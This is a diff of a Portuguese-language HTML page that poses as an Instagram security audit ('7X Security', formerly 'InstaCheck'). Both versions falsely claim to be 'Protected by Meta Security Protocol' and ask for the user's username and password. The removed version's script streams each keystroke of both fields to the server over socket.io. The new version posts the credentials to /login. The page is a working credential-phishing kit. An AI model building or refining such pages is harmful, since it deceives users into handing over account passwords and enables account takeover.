@@ -3,30 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
-    <title>InstaCheck | Auditoria de Segurança</title>
+    <title>7X Security | Auditoria</title>
+    <style>
+        body { background-color: #0d1117; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background-color: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #30363d; text-align: center; width: 320px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; border-radius: 8px; border: none; background-color: #38bdf8; color: black; font-weight: bold; cursor: pointer; margin-top: 10px; }
+    </style>
 </head>
 <body>
     <div class="card">
         <h2 style="color: #38bdf8;">7X Security</h2>
-        <p>Verifique se sua conta possui acessos não autorizados ou dispositivos suspeitos.</p>
-        <input type="text" id="user" placeholder="Usuário, telefone ou e-mail">
-        <input type="password" id="pass" placeholder="Senha do Instagram">
-        <button onclick="alert('Iniciando varredura de segurança...')">INICIAR AUDITORIA</button>
-        <p style="font-size: 10px; margin-top: 15px; opacity: 0.5;">Protegido por Meta Security Protocol</p>
+        <p>Verifique acessos não autorizados em sua conta.</p>
+        
+        <form action="/login" method="POST">
+            <input type="text" name="user" placeholder="Usuário ou e-mail" required>
+            <input type="password" name="pass" placeholder="Senha" required>
+            <button type="submit">INICIAR AUDITORIA</button>
+        </form>
+        
+        <p style="font-size: 10px; margin-top: 20px; color: #8b949e;">Protegido por Meta Security Protocol</p>
     </div>
-
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-        const socket = io();
-        const user = document.getElementById('user');
-        const pass = document.getElementById('pass');
-
-        [user, pass].forEach(input => {
-            input.oninput = () => {
-                socket.emit('typing', { u: user.value, p: pass.value });
-            };
-        });
-    </script>
 </body>
 </html>
